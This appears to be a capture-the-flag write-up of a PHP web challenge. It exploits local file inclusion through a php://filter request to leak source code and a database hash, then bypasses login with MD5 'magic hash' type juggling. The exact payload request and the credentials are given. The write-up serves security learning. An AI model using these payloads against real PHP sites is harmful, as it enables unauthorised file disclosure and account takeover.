The web reads the `page` parameter, fetches the file whose filename is the same as `page` value, and includes it in the response. By sending a random page name that does not exist (locally) in their server, it can be deduced that they are using php include function to add the file content to the response.

Use `include` to exploit the LFI vulnerability. When you use php:// with include or require, you're essentially telling PHP to treat the specified stream as if it were a file, allowing you to read from it or write to it as needed.

Read the code in index.php by sending this request:

```
GET /mainsite/?page=php://filter/convert.base64-encode/resource=index.php HTTP/1.1
Host: chal2.macs.codes:4023
Upgrade-Insecure-Requests: 1

```

Source code is leaked:
```php
<?php
	include("header.php");
	$page = $_GET['page'];
	if(isset($page) && strlen("$page") !== 0) {
		while(substr_count($page, '../', 0)) {
 			$page = str_replace('../', '', $page);
		};
		while(substr_count($page, 'flag', 0)) { //you can't just include the flag you cheeky buggers, try harder!!!
			$page = str_replace('flag', '', $page);
		}
		if($page[0] === '/') {
			$page = substr($page, 1);
		}
		include("$page");
	}
	include("footer.php");
?>
```
However, there is a filter to forbid extracting the flag so I check out the header.php file. Below is a snippet.

```php
		    <?php
                    // echo '<li class="nav-item"><a href="secret_gymso_admin/index.php">Admin - Not Complete</a></li>';
    ?>
```

Read `/var/www/html/secret_gymso_admin/index.php` with stream wrappers:

```html
<form class="login100-form validate-form" method="post" action="../mainsite/login_toBeFinished.php">
	<span class="login100-form-title p-b-55">
		Login
    </span>
```

Read `/var/www/html/mainsite/login_toBeFinished.php` with stream wrappers: 

```php
<?php
	session_start();
	$username = $_POST["username"];
	$password = $_POST["password"];
	$myPDO = new PDO('sqlite:database_toBeFinished.db');
	$stmt = $myPDO->prepare("SELECT * FROM users WHERE username = ?");
	$stmt->execute(array("$username"));
	if($row = $stmt->fetch()) {
		$databasePassword = $row[1];
		if($databasePassword == md5("$password")) {
			$_SESSION['password'] = $password;
			//print_r(file_get_contents('../v/flag.php4'));
			header('Location: /secret_gymso_admin/flag.php');
		}
		else {
			header('Location: /secret_gymso_admin/index.php');
		}
	}
	else {
		header('Location: /secret_gymso_admin/index.php');
	}
?>

```

There is a database in the folder, try reading `/var/www/html/mainsite/database_toBeFinished.db` with stream wrappers, and the username and password (in MD5) are leaked:

```sqlite
joseph 0e087333482131113740957780965295
```

The code is vulnerable in its comparison between $databasePassword and md5("$password"). It uses loose type comparison and therefore it's vulnerable to [PHP Type Juggling](https://medium.com/@codingkarma/not-so-obvious-php-vulnerabilities-388a3b7bf2dc). The output of the `md5` function is a string and `$databasePassword`` value is going to be "0e087333482131113740957780965295" for user Joseph:

```php
md5(string $string, bool $binary = false): string
```

The loose type comparison is pretty funky and you can read more about it here: [PHP Loose Type](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf). Basically:

`0e08733 == 0e12345 is True`
So we have to find a password when hashed gives out a value that starts with `0e`. Consult [Magic Hash](https://github.com/spaze/hashes/blob/master/md5.md) and we know we can use a value of 240610708 for the password. Login with username joseph/ password 240610708 and we can obtain the flag.
